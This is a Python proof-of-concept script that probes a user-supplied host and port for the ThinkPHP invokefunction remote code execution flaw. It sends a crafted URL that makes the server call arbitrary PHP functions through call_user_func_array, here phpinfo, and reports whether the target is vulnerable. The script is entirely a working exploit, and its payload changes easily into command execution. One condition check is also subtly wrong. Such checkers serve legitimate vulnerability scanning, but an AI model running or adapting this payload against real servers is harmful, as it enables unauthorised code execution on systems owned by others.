# /usr/bin/env python
# -*- coding:utf-8 -*-

import sys
import requests

def think_poc(ip, port):
    url = 'http://{ip}:{port}'.format(ip=ip, port=port)
    payload = [r'/thinkphp22/public/index.php/?s=index/\think\app/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=1',
               r'/thinkphp22/public/index.php/?s=index/\think\app/invokefunction&function=phpinfo&vars[0]=100']
    target = url + payload[0]
    print(r"target = '%s'" % target)
    try:
        r = requests.get(url=target, verify=False, timeout=3)
        if 'PHP Version' in r.text or ('PHP' and 'Directive') in r.text:
            return True
        else:
            return False
    except:
        print('[!] Destination address cannot be connected')
        sys.exit()
if __name__ == '__main__':
    try:
        ip = input("Please enter the target address,for example：www.baidu.com or 192.168.1.1\n")
        port = int(input("Please enter the target port,for example：8080\n"))
    except:
        print('输入有误或没有输入数字或字符')
    else:
        if port not in range(0, 65536):
            port = 80
        i = think_poc(ip, port)
        if i:
            print("[+] Remote code execution vulnerability exists at the target address")
        else:
            print("[-] There is no remote code execution vulnerability in the target address")




